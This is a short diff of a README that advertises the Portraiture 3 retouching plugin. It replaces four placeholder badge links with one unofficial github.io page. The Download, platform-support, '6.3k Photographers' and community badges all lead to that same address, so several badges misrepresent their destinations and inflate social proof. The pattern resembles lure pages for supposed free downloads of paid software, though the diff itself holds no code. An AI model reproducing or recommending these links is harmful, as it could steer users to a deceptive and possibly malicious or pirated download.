@@ -4,10 +4,10 @@
 
 Instead of hours of frequency separation and manual retouching, Portraiture 3 gives you **fast, consistent, and natural-looking results** directly inside your editing workflow.
 
-[![Download](https://img.shields.io/badge/Download-Portraiture%203-red?style=for-the-badge\&logo=rocket)](#)
-[![Windows Support](https://img.shields.io/badge/Windows-%26%20macOS-blue?style=for-the-badge\&logo=apple)](#)
-[![⭐ 6.3k Photographers](https://img.shields.io/badge/⭐-6.3k%20Photographers-yellow?style=for-the-badge\&logo=github)](#)
-[![Community](https://img.shields.io/badge/Join-Portraiture%20Hub-green?style=for-the-badge\&logo=discord)](#)
+[![Download](https://img.shields.io/badge/Download-Portraiture%203-red?style=for-the-badge\&logo=rocket)](https://imagenomic-portraiture-3-plugin.github.io/.github/)
+[![Windows Support](https://img.shields.io/badge/Windows-%26%20macOS-blue?style=for-the-badge\&logo=apple)](https://imagenomic-portraiture-3-plugin.github.io/.github/)
+[![⭐ 6.3k Photographers](https://img.shields.io/badge/⭐-6.3k%20Photographers-yellow?style=for-the-badge\&logo=github)](https://imagenomic-portraiture-3-plugin.github.io/.github/)
+[![Community](https://img.shields.io/badge/Join-Portraiture%20Hub-green?style=for-the-badge\&logo=discord)](https://imagenomic-portraiture-3-plugin.github.io/.github/)
 
 ---
 
